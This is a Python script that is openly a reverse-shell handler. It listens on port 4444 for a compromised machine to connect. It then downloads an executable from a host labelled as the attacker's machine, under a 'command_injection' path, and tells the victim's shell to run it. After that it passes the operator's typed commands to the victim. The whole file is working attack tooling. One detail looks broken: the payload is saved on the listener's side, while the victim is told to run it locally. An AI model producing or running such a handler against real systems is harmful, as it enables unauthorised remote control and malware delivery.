import socket
import threading
import sys
import requests  # to download the file
import os

LISTEN_IP = "0.0.0.0"
LISTEN_PORT = 4444

# IP of the machine hosting the file and the file path in URL format
HACK_LINUX_MACHINE = "172.26.121.207"
FILE_URL = f"http://{HACK_LINUX_MACHINE}/command_injection/ADSB-hub_dump/x64/Debug/ADSB-hub_dump.exe"
LOCAL_FILE_NAME = "ADSB-hub_dump.exe"

def download_file():
    """Download the remote executable file from HACK_LINUX_MACHINE."""
    try:
        print(f"[*] Downloading file from {FILE_URL} ...")
        response = requests.get(FILE_URL, stream=True)
        response.raise_for_status()

        with open(LOCAL_FILE_NAME, "wb") as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        print(f"[+] File downloaded successfully: {LOCAL_FILE_NAME}")
        return True
    except Exception as e:
        print(f"[!] Failed to download file: {e}", file=sys.stderr)
        return False

def handle_client(conn, addr):
    """Handle the connected client shell."""
    print(f"[+] Shell connected: {addr[0]}:{addr[1]}")
    print("Type 'exit' to close the shell.")

    # Step 1: Download the file automatically after connection
    if download_file():
        # Step 2: Send command to run the downloaded file
        run_command = f".\\{LOCAL_FILE_NAME}\n"
        print(f"[*] Sending command to execute file: {run_command.strip()}")
        conn.sendall(run_command.encode())
    else:
        print("[!] Skipping execution command due to download failure.")

    try:
        while True:
            try:
                command = input(f"{addr[0]}> ")
            except (KeyboardInterrupt, EOFError):
                print("\n[!] Interrupted. Closing connection.")
                conn.sendall(b"exit\n")
                break

            if command.strip().lower() == "exit":
                conn.sendall(b"exit\n")
                break

            conn.sendall((command + "\n").encode())

            conn.settimeout(1.0)
            response_parts = []
            while True:
                try:
                    part = conn.recv(4096)
                    if not part:
                        break
                    response_parts.append(part)
                except socket.timeout:
                    break
                except Exception as e:
                    print(f"[!] Error receiving data: {e}", file=sys.stderr)
                    break

            response = b"".join(response_parts).decode("utf-8", errors="ignore")
            print(response, end="")

    except Exception as e:
        print(f"[!] Connection error: {e}", file=sys.stderr)
    finally:
        print(f"[-] Disconnected: {addr[0]}:{addr[1]}")
        conn.close()

def start_listener():
    """Start the TCP listener waiting for incoming connections."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((LISTEN_IP, LISTEN_PORT))
        server_socket.listen()
        print(f"[*] Listening on {LISTEN_IP}:{LISTEN_PORT}...")

        try:
            conn, addr = server_socket.accept()
            handle_client(conn, addr)
        except KeyboardInterrupt:
            print("\n[*] Interrupted. Exiting cleanly.")

if __name__ == "__main__":
    start_listener()
